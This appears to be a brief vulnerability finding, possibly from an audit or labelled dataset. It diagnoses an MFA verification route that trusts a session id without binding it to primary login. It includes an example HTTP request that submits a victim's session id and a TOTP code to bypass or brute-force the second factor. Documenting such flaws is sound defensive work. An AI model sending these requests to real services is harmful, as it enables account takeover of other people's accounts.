diagnosis: The MFA verification route reads user data and TOTP secrets from Redis strictly using mfaSessionId without binding the request to an existing primary authentication cookie or proof of initial password validation. An attacker who steals or predicts mfaSessionId can complete MFA challenges or attempt brute-force verification.
exploit_request:
POST /auth/mfa/challenge/verify HTTP/1.1
Host: sso.portal.io
Content-Type: application/json

{"mfaSessionId": "mfa_challenge_victim_8819", "totpCode": "489102"}
